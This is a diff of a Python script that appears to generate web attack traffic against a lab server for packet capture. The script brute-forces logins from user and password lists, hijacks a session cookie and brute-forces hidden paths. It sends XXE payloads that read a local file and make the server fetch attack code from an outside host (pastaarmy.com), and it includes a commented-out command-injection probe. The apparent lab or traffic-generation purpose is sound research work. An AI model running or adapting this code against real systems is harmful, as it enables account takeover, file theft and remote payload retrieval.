@@ -23,6 +23,7 @@ while not sitesUp == 200:
         sleep(5)
     except Exception as ex:
         ic(ex)
+        sleep(5)
 
 # give normal traffic a minute
 sleep(60)
@@ -40,12 +41,12 @@ for i in range(12):
 goodCreds = []
 tryCount = 0
 loginURL = [i for i in URLs if "login" in i][0] # grab the URL with "login" in it
-for user in open("users.txt","r").readlines():
-    for password in open("passwords.txt","r").readlines():
-        payload = {'username': user.strip(),'password':password.strip()}
+for user in open("users.txt","r").readlines(): # iterate through a username list
+    for password in open("passwords.txt","r").readlines(): # iterate through a password list
+        payload = {'username': user.strip(),'password':password.strip()} # try the user:pass combo
         attempt = requests.post(loginURL, headers=header, data=payload, allow_redirects=False)
         tryCount += 1
-        if attempt.status_code == 302:
+        if attempt.status_code == 302: # on this site, 302 indicates success
             goodCreds.append(payload)
 
 ic (goodCreds, tryCount)
@@ -55,10 +56,12 @@ sleep(30)
 # attempt = requests.post(loginURL, headers=header, data=payload, allow_redirects=False)
 # attempt.status_code
 
+# grab a cookie from the good creds
 payload = {'username': goodCreds[0]["username"],'password':goodCreds[0]["password"]}
 attempt = requests.post(loginURL, headers=header, data=payload, allow_redirects=False)
 cookie = attempt.cookies.keys()[0] + "=" + attempt.cookies[attempt.cookies.keys()[0]]
-header["Cookie"]=cookie
+header["Cookie"]=cookie # add cookie to subsequent requests
+ic(header)
 
 sleep(30)
 # brute force browsing
@@ -70,7 +73,7 @@ for line in dirbsUgly:
 forcedPaths = []
 for dirb in dirbs:
     attempt = requests.get(URLs[0] + dirb, headers=header, allow_redirects=False)
-    if attempt.status_code != 404:
+    if attempt.status_code != 404: # if it's not a 404, add it to our list of known good URLs
         forcedPaths.append(dirb)
 
 ic(forcedPaths)
@@ -101,26 +104,31 @@ xmlSSRF1 = b"""<?xml version="1.0" encoding="UTF-8"?>
 """
 
 xmlSSRF2 = b"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://www.pastaarmy.com/attack.xml"> ]>
+<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://www.pastaarmy.com:8000/attack.xml"> ]>
 <product><productId>&id;</productId></product>
 """
 
-header['Content-Type'] = 'application/xml'
+header['Content-Type'] = 'application/xml' # required header for sending XML
+
+# try to just run a command; fails
 attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlRunCmd)
 ic(attempt.content)
 
 sleep(5)
 
+# LFI to grab local file - succeeds!
 attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlGetPasswd)
 ic(attempt.content)
 
 sleep(5)
 
+# get the victim's public IP
 attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlSSRF1)
 ic(attempt.content)
 
 sleep(5)
 
+# pull attack code from pastaarmy.com
 attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlSSRF2)
 ic(attempt.content)
 
@@ -128,16 +136,21 @@ sleep(60)
 
 
 # check out command injection
-try:
-    req = requests.get(URLs[0] + "maintenance.html?cmd=id", headers=header)
-    ic(req.content)
-except Exception as ex:
-    ic(ex)
+# try:
+#     req = requests.get(URLs[0] + "maintenance.html?cmd=id", headers=header)
+#     ic(req.content)
+# except Exception as ex:
+#     ic(ex)
+
+
+# On attacker:
+# journalctl -f -u webattacker.service
 
 # On webserver:
 # tcpdump -i eth0 '(tcp or udp) and not port 22 -w - | tee /home/ubuntu/victim.pcap | tcpdump -r - -nnv'
 # aws s3 cp /home/ubuntu/victim.pcap s3://hammer-bucket8675309/
 # aws s3 cp /var/log/weberror.log s3://hammer-bucket8675309/
+
 # Locally:
 # aws s3 cp s3://hammer-bucket8675309/weberror.log . --profile hammer-deploy
 # aws s3 cp s3://hammer-bucket8675309/victim.pcap . --profile hammer-deploy
